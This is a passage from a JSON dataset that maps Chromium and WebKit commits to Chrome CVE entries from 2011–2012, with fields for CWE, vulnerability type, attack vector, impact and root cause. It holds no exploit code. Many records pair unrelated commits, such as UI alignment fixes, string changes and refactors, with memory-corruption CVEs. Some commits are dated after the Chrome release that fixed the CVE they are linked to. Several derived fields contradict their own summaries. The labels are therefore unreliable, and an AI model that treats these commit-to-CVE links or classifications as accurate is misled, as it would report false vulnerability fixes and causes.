allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted document.","commit_message_1":"remove deprecated accelerator ctor that take booleans","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted document","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"cec36a7bfa7411a4992820ce8639310b2b426eeb","cve_id":"CVE-2012-2863","cwe_id":"CWE-119","commit_message":"Make ScopedGenericObj compile with strict warnings when used with non-pointers.\n\nNo intended functionality change.  Required for a future clang roll.\n\nBUG=none\nTEST=none\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10310183\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@137361 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The PDF functionality in Google Chrome before 21.0.1180.75 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger out-of-bounds write operations.","commit_message_1":"make scopedgenericobj compile with strict warning when used with non-pointers","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger out - of - bounds write operations","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"e3171b346e6919f4162ea128d0f7b342cf878fd4","cve_id":"CVE-2012-2842","cwe_id":"CWE-399","commit_message":"ash: Fix right-alignment of power-status text.\n\nIt turns out setting ALING_RIGHT on a Label isn't enough to get proper\nright-aligned text. Label has to be explicitly told that it is multi-lined.\n\nBUG=none\nTEST=none\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9918026\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@129898 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 20.0.1132.57 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to counter handling.","commit_message_1":"fix right-alignment of power-status text","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to counter handling","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within counter handling","Attack Type":"remote attacker"},{"commit_id":"46afbe7f7f55280947e9c06c429a68983ba9d8dd","cve_id":"CVE-2012-2844","cwe_id":null,"commit_message":"[EFL][WK2] Add --window-size command line option to EFL MiniBrowser\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=100942\n\nPatch by Mikhail Pozdnyakov <mikhail.pozdnyakov@intel.com> on 2012-11-05\nReviewed by Kenneth Rohde Christiansen.\n\nAdded window-size (-s) command line option to EFL MiniBrowser.\n\n* MiniBrowser\/efl\/main.c:\n(window_create):\n(parse_window_size):\n(elm_main):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@133450 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The PDF functionality in Google Chrome before 20.0.1132.57 does not properly handle JavaScript code, which allows remote attackers to cause a denial of service (incorrect object access) or possibly have unspecified other impact via a crafted document.","commit_message_1":"[ wk2 ] add -- window-size command line option to efl minibrowser http : \/\/<file>","Vulnerability Type":"incorrect object access","Attack Vector":"via a crafted document","Impact":"cause a denial of service ( incorrect object access ) or possibly have unspecified other impact","Root Cause":"does not properly handle javascript code","Attack Type":"remote attacker"},{"commit_id":"48fae61b8a6c9b741f001d478c595b6c7c0af4d9","cve_id":"CVE-2012-2816","cwe_id":null,"commit_message":"Prevent sandboxed processes from opening each other \n\nTBR=brettw\nBUG=117627\nBUG=119150\nTEST=sbox_validation_tests\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9716027\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@132477 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 20.0.1132.43 on Windows does not properly isolate sandboxed processes, which might allow remote attackers to cause a denial of service (process interference) via unspecified vectors.","commit_message_1":"prevent sandboxed process from opening each other tb bug=<number> bug=<number> review url : http : \/\/<file>","Vulnerability Type":"process interference","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( process interference )","Root Cause":"does not properly isolate sandboxed processes","Attack Type":"remote attacker"},{"commit_id":"cd0bd79d6ebdb72183e6f0833673464cc10b3600","cve_id":"CVE-2012-2816","cwe_id":null,"commit_message":"Convert plugin and GPU process to brokered handle duplication.\n\nBUG=119250\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9958034\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@132303 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 20.0.1132.43 on Windows does not properly isolate sandboxed processes, which might allow remote attackers to cause a denial of service (process interference) via unspecified vectors.","commit_message_1":"convert plugin and gpu process to brokered handle duplication","Vulnerability Type":"process interference","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( process interference )","Root Cause":"does not properly isolate sandboxed processes","Attack Type":"remote attacker"},{"commit_id":"9b9a9f33f0a26f40d083be85a539dd7963adfc9b","cve_id":"CVE-2012-2817","cwe_id":"CWE-399","commit_message":"Explicitly stopping thread in MediaStreamImpl dtor to avoid any racing issues.\n\nThis may solve the below bugs.\n\nBUG=112408,111202\nTEST=content_unittests\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9307058\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@120222 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 20.0.1132.43 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to tables that have sections.","commit_message_1":"explicitly stopping thread in mediastreamimpl dtor to avoid any racing issue","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to tables that have sections","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"a use-after-free","Attack Type":"remote attacker"},{"commit_id":"dbcfe72cb16222c9f7e7907fcc5f35b27cc25331","cve_id":"CVE-2012-2820","cwe_id":"CWE-20","commit_message":"Removing dead code from NetworkActionPredictor.\n\nBUG=none\n\n\nReview URL: http:\/\/codereview.chromium.org\/9358062\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@121926 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 20.0.1132.43 does not properly implement SVG filters, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"removing dead code from networkactionpredictor","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly implement svg filters","Attack Type":"remote attacker"},{"commit_id":"7c2785fab1685c8735288dfbbbb617d9c4f5d8b2","cve_id":"CVE-2012-2824","cwe_id":"CWE-399","commit_message":"Set the access qualifier of two methods to query frame specific info of BitmapImage to protected.\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=90505\n\nPatch by Huang Dongsung <luxtella@company100.net> on 2012-08-12\nReviewed by Eric Seidel.\n\nFollowing 4 methods are protected.\n  size_t frameCount();\n  NativeImagePtr frameAtIndex(size_t);\n  bool frameIsCompleteAtIndex(size_t);\n  float frameDurationAtIndex(size_t);\n\nSo, 2 methds also should be protected because the frame info is only specific of\nBitmapImage.\n  bool frameHasAlphaAtIndex(size_t);\n  ImageOrientation frameOrientationAtIndex(size_t);\n\nOn the other hand, this patch amended GraphicsContext3DCG.\n- static_cast<BitmapImage*>(image)->frameHasAlphaAtIndex(0)\n+ image->currentFrameHasAlpha()\n\nThis patch does not affect PNG, JPEG, BMP, and WEBP because those images\nhave only 0 indexed frame.\nThus, GIF, and ICO are affected. However, an above query to get Alpha\nis for the image that is created by image->nativeImageForCurrentFrame(), so it\nis proper to use image->currentFrameHasAlpha() instead of\nimage->frameHasAlphaAtIndex(0).\n\nNo new tests, because it is hard to test. We need an animated GIF that\none frame has alpha and another frame does not have alpha. However, I\ncannot find the animated GIF file that suffices the requirement.\n\n* platform\/graphics\/BitmapImage.h:\n(BitmapImage):\n* platform\/graphics\/cg\/GraphicsContext3DCG.cpp:\n(WebCore::GraphicsContext3D::getImageData):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@125374 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 20.0.1132.43 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to SVG painting.","commit_message_1":"set the access qualifier of two method to query frame specific info of bitmapimage to protected","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to svg painting","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"a use-after-free","Attack Type":"remote attacker"},{"commit_id":"1595f66a8dec04864afd048809cd9d0802049feb","cve_id":"CVE-2012-2833","cwe_id":"CWE-119","commit_message":"[V8] ASSERT that removeAllDOMObjects() is called only on worker threads\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=100046\n\nReviewed by Eric Seidel.\n\nThis function is called only on worker threads. We should ASSERT that\nfact and remove the dead code that tries to handle the main thread\ncase.\n\n* bindings\/v8\/V8DOMMap.cpp:\n(WebCore::removeAllDOMObjects):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@132156 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Buffer overflow in the JS API in the PDF functionality in Google Chrome before 20.0.1132.43 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"assert that removealldomobjects ( ) is called only on worker thread http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"Buffer overflow","Attack Type":"remote attacker"},{"commit_id":"f183580d61c054f7f6bb35cfe29e1b342390fbeb","cve_id":"CVE-2012-2807","cwe_id":"CWE-189","commit_message":"Attempt to address libxml crash.\n\nBUG=129930\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10458051\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@142822 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple integer overflows in libxml2, as used in Google Chrome before 20.0.1132.43 and other products, on 64-bit Linux platforms allow remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"attempt to address libxml crash","Vulnerability Type":"multiple integer overflow","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"An error","Attack Type":"remote attacker"},{"commit_id":"1a828911013ff501b87aacc5b555e470b31f2909","cve_id":"CVE-2011-3953","cwe_id":null,"commit_message":"Use XFixes to update the clipboard sequence number.\n\nBUG=73478\nTEST=manual testing\n\nReview URL: http:\/\/codereview.chromium.org\/8501002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@109528 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 17.0.963.46 does not prevent monitoring of the clipboard after a paste event, which has unspecified impact and remote attack vectors.","commit_message_1":"use xfixes to update the clipboard sequence number","Vulnerability Type":"unspecified","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"execute arbitrary code","Root Cause":"does not prevent monitoring of the clipboard after a paste event","Attack Type":"remote attacker"},{"commit_id":"4c69e5e58bdf8717140328e5528325af56e7211e","cve_id":"CVE-2011-3955","cwe_id":null,"commit_message":"[V8] Remove unused methods in V8Proxy\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=93106\n\nReviewed by Adam Barth.\n\nIn preparation for removing V8Proxy, we can remove unused methods in V8Proxy.\n\nNo tests. No change in behavior.\n\n* bindings\/v8\/V8Proxy.h:\n(V8Proxy):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@124630 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 17.0.963.46 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via vectors that trigger the aborting of an IndexedDB transaction.","commit_message_1":"remove unused method in v8proxy http : \/\/<file>","Vulnerability Type":"application crash","Attack Vector":"via vectors that trigger the aborting of an indexeddb transaction","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by an error when aborting an IndexDB transaction","Attack Type":"remote attacker"},{"commit_id":"04915c26ea193247b8a29aa24bfa34578ef5d39e","cve_id":"CVE-2011-3956","cwe_id":"CWE-264","commit_message":"[Qt] Remove an unnecessary masking from swapBgrToRgb()\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=103630\n\nReviewed by Zoltan Herczeg.\n\nGet rid of a masking command in swapBgrToRgb() to speed up a little bit.\n\n* platform\/graphics\/qt\/GraphicsContext3DQt.cpp:\n(WebCore::swapBgrToRgb):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@136375 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The extension implementation in Google Chrome before 17.0.963.46 does not properly handle sandboxed origins, which might allow remote attackers to bypass the Same Origin Policy via a crafted extension.","commit_message_1":"remove an unnecessary masking from swapbgrtorgb ( ) http : \/\/<file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted extension","Impact":"bypass the same origin policy","Root Cause":"does not properly handle sandboxed origins , which","Attack Type":"remote attacker"},{"commit_id":"b712795852f9d6073e062680e280634290c4ba5d","cve_id":"CVE-2011-3961","cwe_id":"CWE-362","commit_message":"Fix uninitialized variables in HarfBuzzShaperBase\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=79546\n\nReviewed by Dirk Pranke.\n\nThese were introduced in r108733.\n\n* platform\/graphics\/harfbuzz\/HarfBuzzShaperBase.cpp:\n(WebCore::HarfBuzzShaperBase::HarfBuzzShaperBase):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@108871 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Race condition in Google Chrome before 17.0.963.46 allows remote attackers to execute arbitrary code via vectors that trigger a crash of a utility process.","commit_message_1":"fix uninitialized variable in harfbuzzshaperbase http : \/\/<file>","Vulnerability Type":"Race Condition","Attack Vector":"via vectors that trigger a crash of a utility process","Impact":"execute arbitrary code","Root Cause":"caused by a race condition after a crash of a utility process","Attack Type":"remote attacker"},{"commit_id":"0c14577c9905bd8161159ec7eaac810c594508d0","cve_id":"CVE-2011-3964","cwe_id":null,"commit_message":"Change omnibox behavior when stripping javascript schema to navigate after stripping the schema on drag drop.\n\nBUG=109245\nTEST=N\/A\nReview URL: http:\/\/codereview.chromium.org\/9116016\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@116692 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 17.0.963.46 does not properly implement the drag-and-drop feature, which makes it easier for remote attackers to spoof the URL bar via unspecified vectors.","commit_message_1":"change omnibox behavior when stripping javascript schema to navigate after stripping the schema on drag drop","Vulnerability Type":"unspecified","Attack Vector":"via unspecified vectors","Impact":"spoof the url bar","Root Cause":"does not properly implement the drag - and - drop feature ","Attack Type":"remote attacker"},{"commit_id":"7352baf29ac44d23cd580c2edfa8faf4e140a480","cve_id":"CVE-2011-3965","cwe_id":"CWE-20","commit_message":"Fix null deref when walking cert chain.\n\nBUG=109664\nTEST=N\/A\nReview URL: http:\/\/codereview.chromium.org\/9150013\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@117080 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 17.0.963.46 does not properly check signatures, which allows remote attackers to cause a denial of service (application crash) via unspecified vectors.","commit_message_1":"fix null deref when walking cert chain","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( application crash )","Root Cause":"does not properly check signatures","Attack Type":"remote attacker"},{"commit_id":"76e6e7c63aaa8e30e4143b8db9fc7d754812e718","cve_id":"CVE-2011-3967","cwe_id":null,"commit_message":"return early from ProcessRawBytesWithSeperators() when data length is 0\n\nBUG=109717\nTEST=N\/A\nReview URL: http:\/\/codereview.chromium.org\/9169028\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@117241 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Unspecified vulnerability in Google Chrome before 17.0.963.46 allows remote attackers to cause a denial of service (application crash) via a crafted certificate.","commit_message_1":"return early from processrawbyteswithseperators ( ) when data length is <number> bug=<number> review url : http : \/\/<file>","Vulnerability Type":"unspecified","Attack Vector":"via a crafted certificate","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by the improper handling of unusual certificates","Attack Type":"remote attacker"},{"commit_id":"58ffd25567098d8ce9443b7c977382929d163b3d","cve_id":"CVE-2011-3927","cwe_id":"CWE-19","commit_message":"[skia] not all convex paths are convex, so recompute convexity for the problematic ones\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=75960\n\nReviewed by Stephen White.\n\nNo new tests.\nSee related chrome issue\nhttp:\/\/code.google.com\/p\/chromium\/issues\/detail?id=108605\n\n* platform\/graphics\/skia\/GraphicsContextSkia.cpp:\n(WebCore::setPathFromConvexPoints):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@104609 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Skia, as used in Google Chrome before 16.0.912.77, does not perform all required initialization of values, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"not all convex path are convex , so recompute convexity for the problematic one http : \/\/<file>","Vulnerability Type":"Data Processing Errors","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not perform all required initialization of values ,","Attack Type":"remote attacker"},{"commit_id":"d82b03d21f7e581f9206ef1fec4959ae7b06b8eb","cve_id":"CVE-2011-3919","cwe_id":"CWE-119","commit_message":"Pull entity fix from upstream.\n\nBUG=107128\nReview URL: http:\/\/codereview.chromium.org\/9072008\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@116175 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Heap-based buffer overflow in libxml2, as used in Google Chrome before 16.0.912.75, allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"pull entity fix from upstream","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the xmlStringLenDecodeEntities() function of libxml2","Attack Type":"remote attacker"},{"commit_id":"b2dfe7c175fb21263f06eb586f1ed235482a3281","cve_id":"CVE-2011-3103","cwe_id":"CWE-399","commit_message":"[EFL] fast\/frames\/frame-crash-with-page-cache.html is crashing\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=85879\n\nPatch by Mikhail Pozdnyakov <mikhail.pozdnyakov@intel.com> on 2012-05-17\nReviewed by Noam Rosenthal.\n\nSource\/WebKit\/efl:\n\n_ewk_frame_smart_del() is considering now that the frame can be present in cache.\nloader()->detachFromParent() is only applied for the main frame.\nloader()->cancelAndClear() is not used anymore.\n\n* ewk\/ewk_frame.cpp:\n(_ewk_frame_smart_del):\n\nLayoutTests:\n\n* platform\/efl\/test_expectations.txt: Removed fast\/frames\/frame-crash-with-page-cache.html.\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@117409 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google V8, as used in Google Chrome before 19.0.1084.52, does not properly perform garbage collection, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted JavaScript code.","commit_message_1":"patch by mikhail pozdnyakov < <file> @ <file> > on source\/webkit\/efl : _ewk_frame_smart_del ( ) is considering now that the frame can be present in cache","Vulnerability Type":"Resource Management Errors","Attack Vector":"via crafted javascript code","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"does not properly perform garbage collection","Attack Type":"remote attacker"},{"commit_id":"6b5f83842b5edb5d4bd6684b196b3630c6769731","cve_id":"CVE-2011-3104","cwe_id":"CWE-119","commit_message":"[i18n-fixlet] Make strings branding specific in extension code.\n\nIDS_EXTENSIONS_UNINSTALL\nIDS_EXTENSIONS_INCOGNITO_WARNING\nIDS_EXTENSION_INSTALLED_HEADING\nIDS_EXTENSION_ALERT_ITEM_EXTERNAL And fix a $1 $1 bug.\nIDS_EXTENSION_INLINE_INSTALL_PROMPT_TITLE\n\nBUG=NONE\nTEST=NONE\n\n\nReview URL: http:\/\/codereview.chromium.org\/9107061\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@118018 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Skia, as used in Google Chrome before 19.0.1084.52, allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"make string branding specific in extension code","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an error within Skia","Attack Type":"remote attacker"},{"commit_id":"d6cc2749d2f90acc2d92a526c1d2cbebbc101a19","cve_id":"CVE-2011-3105","cwe_id":"CWE-399","commit_message":"sync: remove Chrome OS specific logic to deal with flimflam shutdown \/ sync race.\n\nNo longer necessary as the ProfileSyncService now aborts sync network traffic on shutdown.\n\nBUG=chromium-os:20841\n\n\nReview URL: http:\/\/codereview.chromium.org\/9358007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@120912 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the Cascading Style Sheets (CSS) implementation in Google Chrome before 19.0.1084.52 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the :first-letter pseudo-element.","commit_message_1":"remove chrome o specific logic to deal with flimflam shutdown \/ sync race","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the : first - letter pseudo - element","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an error related to v8 garbage collection","Attack Type":"remote attacker"},{"commit_id":"5385c44d9634d00b1cec2abf0fe7290d4205c7b0","cve_id":"CVE-2011-3106","cwe_id":"CWE-119","commit_message":"Inherits SupportsWeakPtr<T> instead of having WeakPtrFactory<T>\n\nThis change refines r137676.\n\nBUG=122654\nTEST=browser_test\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10332233\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@139771 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The WebSockets implementation in Google Chrome before 19.0.1084.52 does not properly handle use of SSL, which allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via unspecified vectors.","commit_message_1":"inherits supportsweakptr < t > instead of having weakptrfactory < t > this change refines r137676","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"execute arbitrary code or cause a denial of service ( memory corruption )","Root Cause":"does not properly handle use of ssl","Attack Type":"remote attacker"},{"commit_id":"89e4098439f73cb5c16996511cbfdb171a26e173","cve_id":"CVE-2011-3107","cwe_id":null,"commit_message":"[Qt][WK2] There's no way to test the gesture tap on WTR\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=92895\n\nReviewed by Kenneth Rohde Christiansen.\n\nSource\/WebKit2:\n\nAdd an instance of QtViewportHandler to QQuickWebViewPrivate, so it's\nnow available on mobile and desktop modes, as a side effect gesture tap\nevents can now be created and sent to WebCore.\n\nThis is needed to test tap gestures and to get tap gestures working\nwhen you have a WebView (in desktop mode) on notebooks equipped with\ntouch screens.\n\n* UIProcess\/API\/qt\/qquickwebview.cpp:\n(QQuickWebViewPrivate::onComponentComplete):\n(QQuickWebViewFlickablePrivate::onComponentComplete): Implementation\nmoved to QQuickWebViewPrivate::onComponentComplete.\n* UIProcess\/API\/qt\/qquickwebview_p_p.h:\n(QQuickWebViewPrivate):\n(QQuickWebViewFlickablePrivate):\n\nTools:\n\nWTR doesn't create the QQuickItem from C++, not from QML, so a call\nto componentComplete() was added to mimic the QML behaviour.\n\n* WebKitTestRunner\/qt\/PlatformWebViewQt.cpp:\n(WTR::PlatformWebView::PlatformWebView):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@124625 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 19.0.1084.52 does not properly implement JavaScript bindings for plug-ins, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"[ wk2 ] there 's no way to test the gesture tap on wtr http : \/\/<file>","Vulnerability Type":"application crash","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"does not properly implement javascript bindings for plug - ins","Attack Type":"remote attacker"},{"commit_id":"23a52bd208885df236cde3ad2cd162b094c0bbe4","cve_id":"CVE-2011-3110","cwe_id":"CWE-119","commit_message":"Do not require DevTools extension resources to be white-listed in manifest.\n\nCurrently, resources used by DevTools extensions need to be white-listed as web_accessible_resources in manifest. This is quite inconvenitent and appears to be an overkill, given the fact that DevTools front-end is\n (a) trusted and\n (b) picky on the frames it loads.\nThis change adds resources that belong to DevTools extensions and are being loaded into a DevTools front-end page to the list of exceptions from web_accessible_resources check.\n\nBUG=none\nTEST=DevToolsExtensionTest.*\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9663076\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@126378 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The PDF functionality in Google Chrome before 19.0.1084.52 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger out-of-bounds write operations.","commit_message_1":"do not require devtools extension resource to be white-listed in manifest","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger out - of - bounds write operations","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an error within PDF handling","Attack Type":"remote attacker"},{"commit_id":"3c036ca040c114c077e13c35baaea78e2ddbaf61","cve_id":"CVE-2011-3110","cwe_id":"CWE-119","commit_message":"[chromium] We should accelerate all transformations, except when we must blend matrices that cannot be decomposed.\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=95855\n\nReviewed by James Robinson.\n\nSource\/Platform:\n\nWebTransformOperations are now able to report if they can successfully blend.\nWebTransformationMatrix::blend now returns a bool if blending would fail.\n\n* chromium\/public\/WebTransformOperations.h:\n(WebTransformOperations):\n* chromium\/public\/WebTransformationMatrix.h:\n(WebTransformationMatrix):\n\nSource\/WebCore:\n\nWebTransformOperations are now able to report if they can successfully blend.\nWebTransformationMatrix::blend now returns a bool if blending would fail.\n\nUnit tests:\n  AnimationTranslationUtilTest.createTransformAnimationWithNonDecomposableMatrix\n  AnimationTranslationUtilTest.createTransformAnimationWithNonInvertibleTransform\n\n* platform\/chromium\/support\/WebTransformOperations.cpp:\n(WebKit::blendTransformOperations):\n(WebKit::WebTransformOperations::blend):\n(WebKit::WebTransformOperations::canBlendWith):\n(WebKit):\n(WebKit::WebTransformOperations::blendInternal):\n* platform\/chromium\/support\/WebTransformationMatrix.cpp:\n(WebKit::WebTransformationMatrix::blend):\n* platform\/graphics\/chromium\/AnimationTranslationUtil.cpp:\n(WebCore::WebTransformAnimationCurve):\n\nSource\/WebKit\/chromium:\n\nAdded the following unit tests:\n  AnimationTranslationUtilTest.createTransformAnimationWithNonDecomposableMatrix\n  AnimationTranslationUtilTest.createTransformAnimationWithNonInvertibleTransform\n\n* tests\/AnimationTranslationUtilTest.cpp:\n(WebKit::TEST):\n(WebKit):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@127868 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The PDF functionality in Google Chrome before 19.0.1084.52 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger out-of-bounds write operations.","commit_message_1":"we should accelerate all transformation , except when we must blend matrix that can not be decomposed","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger out - of - bounds write operations","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an error within PDF handling","Attack Type":"remote attacker"},{"commit_id":"7ee3acb08d9de663e5ec3148ee98b666cd32ad82","cve_id":"CVE-2011-3114","cwe_id":"CWE-119","commit_message":"Ash: Fix fullscreen window bounds\n\nI was computing the non-client frame top border height incorrectly for fullscreen windows, so it was trying to draw a few pixels of transparent non-client border.\n\nBUG=118774\nTEST=visual\n\n\nReview URL: http:\/\/codereview.chromium.org\/9810014\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@128014 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple buffer overflows in the PDF functionality in Google Chrome before 19.0.1084.52 allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger unknown function calls.","commit_message_1":"fix fullscreen window bound i wa computing the non-client frame top border height incorrectly for fullscreen window , so it wa trying to draw a few pixel of transparent non-client border","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger unknown function calls","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by PDF functions","Attack Type":"remote attacker"},{"commit_id":"d6b061bf189e0661a3d94d89dbcb2e6f70b433da","cve_id":"CVE-2011-3083","cwe_id":"CWE-119","commit_message":"Give the media context an ftp job factory; prevent a browser crash.\n\nBUG=112983\nTEST=none\n\n\nReview URL: http:\/\/codereview.chromium.org\/9372002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@121378 0039d316-1c4b-4281-b951-d872f2087c98","summary":"browser\/profiles\/profile_impl_io_data.cc in Google Chrome before 19.0.1084.46 does not properly handle a malformed ftp URL in the SRC attribute of a VIDEO element, which allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted web page.","commit_message_1":"give the medium context an ftp job factory ; prevent a browser crash","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted web page","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"does not properly handle a malformed ftp 